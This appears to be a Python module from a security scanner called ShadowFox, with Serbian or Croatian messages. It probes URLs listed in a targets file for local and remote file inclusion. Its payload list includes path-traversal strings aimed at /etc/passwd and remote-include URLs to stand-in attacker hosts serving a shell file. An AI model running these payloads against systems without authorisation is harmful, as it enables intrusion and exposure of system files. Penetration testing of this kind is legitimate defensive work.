import requests
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def scan_lfi_rfi(url):
    payloads = [
        "../../../../etc/passwd", 
        "..%2F..%2F..%2Fetc%2Fpasswd", 
        "/etc/passwd",
        "http://evil.com/shell.txt",   # RFI test payload (should be hosted)
        "https://attacker.site/malicious.txt"
    ]

    headers = {
        "User-Agent": "ShadowFox-LFI-RFI-Scanner"
    }

    for payload in payloads:
        if "FUZZ" in url:
            target = url.replace("FUZZ", payload)
        else:
            target = f"{url}?page={payload}"

        try:
            res = requests.get(target, headers=headers, timeout=8)
            if "root:x:" in res.text or "[extensions]" in res.text or "shell" in res.text:
                log_to_text(f"[LFI-RFI] {target} -> {payload}")
                severity = classify_severity(res.text)
                ai_trigger_if_needed("LFI-RFI", target, payload, res.text, severity)
                print(f"[+] POTENCIJALNA RANJIVOST: {target}")
                return {"target": target, "payload": payload, "severity": severity}
        
        except Exception as e:
            print(f"[-] Greška za {target}: {e}")
    
    print("[-] Nema LFI/RFI ranjivosti za ovaj URL.")
    return None

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        urls = f.read().splitlines()
    
    for url in urls:
        result = scan_lfi_rfi(url)
        if result:
            print(f"[!] Pronađeno: {result}")
